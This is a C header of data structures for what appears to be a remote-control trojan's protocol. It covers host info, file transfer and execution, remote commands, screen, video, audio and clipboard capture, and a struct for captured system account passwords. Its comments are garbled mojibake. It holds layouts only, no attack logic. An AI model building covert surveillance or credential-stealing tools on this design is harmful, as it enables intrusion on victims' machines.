//�ṹ�嶨��
#pragma once
#include "stdafx.h"

//���ݴ���Ľڵ�
typedef struct 
{
	int nMsgCmd;         //��Ϣ����
	BYTE context[CONTEXT_BUF_SIZE];  //���ݴ���Ļ�����
}MSGINFO;

//������(�⼦)��Ϣ
typedef struct 
{
	char szWANIP[IPADDR_SIZE];    //����IP��ַ
	char szLocalIP[IPADDR_SIZE];  //����IP��ַ
	char hostName[255];   //�������
	bool Cam; //����ͷ
	int OSVer;  //����ϵͳ�汾
	wchar_t szCPUInfo[MAX_PATH]; //cpu��Ϣ
	DWORD dwDiskSize;  //Ӳ����Ϣ
}SYSTEMINFO;

typedef struct tagDRIVER  //������Ϣ
{
	wchar_t disk;    //������
	double dwTotal;   //���̵Ĵ�С
	double dwFree;    //ʣ��ռ�
	int nType;  //����
}DRIVER_C;

typedef struct tagFILEINFO      //�ļ���Ϣ
{
	TCHAR szFileName[MAX_PATH]; //�ļ���
	int nType;                  //�ļ�����(�ļ�\�ļ���)
	__int64 size;               //�ļ���С
}FILEINFO_C;

typedef struct tagDOWNFILEDATA   //�ļ��������ݿ�ṹ
{
	BYTE context[512];  //�����ݵĴ�С
	UINT size;          //�ļ���С
	UINT nCount;        //���������ڽ���������ʾ
	bool bFlag;         //�ļ��Ƿ������
}DOWNFILEDATA_C;

typedef struct tagFILEEXECINFO  //�ļ�ִ�н����Ϣ
{
	TCHAR szFilePath[MAX_PATH];  //�ļ���
	bool bSuccess;              //ִ�н��
}FILEEXECINFO_C;

typedef struct tagFILECOPY    //�ļ����ƽ����Ϣ
{
	wchar_t szFilePath[MAX_PATH];  //�ļ�ȫ·��
	wchar_t szFileName[MAX_PATH];  //�ļ���
	bool bTag;                     //�Ƿ�ʼ����
}FILECOPY_C;

typedef struct tagATTRIBUTE   //����
{
	wchar_t szFilePath[MAX_PATH];  //�ļ����ڵ�Ŀ¼
	wchar_t szFileName[MAX_PATH];  //�ļ���
	int nType;                     //�ļ�(��)����
    SYSTEMTIME sysCreateTime;      //����ʱ��
	SYSTEMTIME sysModifyTime;      //�޸�ʱ��
	SYSTEMTIME sysVisitTime;       //����ʱ��
	bool bArchive;                 //�浵
	bool bReadOnly;                //ֻ��
	bool bHide;                    //����
	bool bSystem;                  //ϵͳ
}ATTRIBUTE_C;

typedef struct tagCMD       //CMD������Ϣ
{
	int flag;
	char command[1024];  //������
}COMMOND_C;

typedef struct tagCHATMSG   //������Ϣ
{
	bool bfirstSend;   //�Ƿ��һ�η�����Ϣ
	bool bClose;  //�Ƿ�ر�
	wchar_t szChatMsg[1024];  //��������
}CHATMSG_C;

typedef struct tagPROGRESS   //�����б���Ϣ
{
	wchar_t szProName[MAX_PATH];   //������
	int nPid;            //����ID��
	int nThreadCount;    //�߳�����
	int nLevel;          //���̼���
	wchar_t szProPath[MAX_PATH];  //����·��
	int nTag;     //�����������ǲ��ǳɹ���(�����ؼ���)
}PROGRESS_C;

typedef struct tagBMPHEADINFO  //BMPλͼͷ��Ϣ
{
	BITMAPINFO tagBitmapInfo;   //λͼ��Ϣ
}BMPHEADINFO_C;

typedef struct tagBMPDATA  //BMPͼ������
{
	BITMAPINFO bmpinfo;  //λͼ��Ϣ
	int Id;
	bool bShow;  //�Ƿ������ʾͼ��
	int Size;
	int HeadSize;
	UINT Begin;      
	BYTE Data[SCREEN_BUF_SIZE];   //����Ľṹ���С��64 + 4030 = 4094 < 4 * 1024
}BMPDATA_C;

typedef struct tagREADPSWDATA  //��Ҫ��ϵͳ�ʺź�����
{
	wchar_t szUserName[250];  //�ʺ�
	wchar_t szUserPwd[250];   //����
	wchar_t szDomain[250];    //��
	wchar_t szErrorMsg[50];   //������Ϣ
}READPSWDATA_C;

typedef struct tagVIDEODATA  //��������
{
	BITMAPINFO bmpinfo;  //λͼ��Ϣ
	int Id;
	bool bShow;         //�Ƿ������ʾͼ��
	DWORD Size;         //���ݴ�С 
	int HeadSize;       //����ͷ����
	UINT Begin;         //�ڼ��η���
	int dwExtend1;     //ѹ��ǰ����
	int dwExtend2;     //ѹ���󳤶�
	BYTE Data[VIDEO_BUF_SIZE];   //����Ľṹ���С��74 + 4020 = 4094 < 4 * 1024
}VIDEODATA_C;

typedef struct tagOPERATOR  //�ػ�/ע��/����
{
	int nType;  //���ͣ�0--��ʾ�ػ��� 1--��ʾע���� 2--��ʾ������
}OPERATOR_C;

typedef struct tagAUDIODATA  //��������
{
	int Id;
	bool bRead;  //�Ƿ����������
	DWORD dwSize;  //���ݴ�С
	UINT Begin;    //�ڼ��η���
	BYTE Data[AUDIO_BUF_SIZE];  //����
}AUDIODATA_C;

typedef struct tagINTERNET  //��ҳ
{
	bool bDownLoad;   //�Ƿ������ļ�
	bool bRunExe;   //�Ƿ����������ļ�
	wchar_t szWebSite[MAX_PATH];  //��ҳ��·��
}INTERNET_C;

typedef struct tagWNDINFO  //������Ϣ
{
	wchar_t szTitle[MAX_PATH];  //����
	wchar_t szContent[MAX_PATH];  //����
	UINT nType;    //����
}WNDINFO_C;

typedef struct tagBROADCAST  //�㲥����
{
	bool bTag;  //��־
	INTERNET_C tagInternet;
    WNDINFO_C tagWndInfo;
}BROADCAST_C;

typedef struct tagDESKTOPINFO  //�������
{
	int nType;  //��������
	bool bTag;  //�������
}DESKTOPINFO_C;

typedef struct tagCLIPBOARD
{
	int id;
	bool bRead;  //�Ƿ����������
	DWORD dwSize;  //���ݴ�С
	UINT Begin;    //�ڼ��η���
	char Data[CLIPBOARD_BUF_SIZE];  //����
}CLIPBOARD_C;
//------------------------------------------------------

//����ϵͳ�İ汾��
enum SYSVERSION
{
	OS_2000,
	OS_XP,
	OS_2003,
	OS_Vista,   //Vista�汾����2008 serverһ��
	OS_WIN7,
	OS_WIN8,
	OS_UNKNOWN  //δ֪����ϵͳ
};

//Ӳ������
enum DISKTYPE
{
	DISK_FIXED,        //�̶�Ӳ��
	DISK_REMOVABLE,    //�ƶ�Ӳ��
	DISK_CDROM        //CD-ROM
};

//�ļ�����
enum FILEATTR
{
	FILE_ATTR,    //�ļ�
	FOLDER_ATTR,   //�ļ���
	FILE_TAG       //��־λ����ʾ�ļ���Ϣ�Ѿ��������
};

//�������ȼ�
enum PROGRESS_LEVEL  
{
	UNKNOWN_LEVEL,    //δ֪
	NORMAL,           //��׼
	IDLE,             //��
	REALTIME,         //ʵʱ
	HIGH,             //��
	ABOVENORMAL,      //���ڱ�׼
	BELOWNORMAL       //���ڱ�׼
};

//�����������
enum DESKTOP_TYPE
{
	MOUSE_MOVE,   //����ƶ�
	DESKTOP_ICON,  //����ͼ��
	TASKBAR,      //�������
	CLIPBOARD    //������
};